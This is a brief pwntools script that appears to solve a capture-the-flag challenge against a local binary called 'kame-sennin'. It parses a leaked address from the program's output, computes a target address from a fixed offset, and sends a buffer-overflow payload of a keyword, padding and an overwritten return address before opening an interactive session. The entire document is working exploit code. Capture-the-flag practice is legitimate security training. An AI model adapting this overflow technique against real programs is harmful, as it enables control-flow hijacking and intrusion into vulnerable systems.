from pwn import *

p = process("./kame-sennin")

p.recvuntil("according to ")
op_addr_str = p.recvuntil("?", drop=True)

op_addr = int(op_addr_str, 16)

log.info(f"Addr: {hex(op_addr)}")
dragon_ball = op_addr - 0x129

payload = b"FairyTail" + b"A" * 63 + p64(dragon_ball)

p.sendline(payload)
p.interactive()



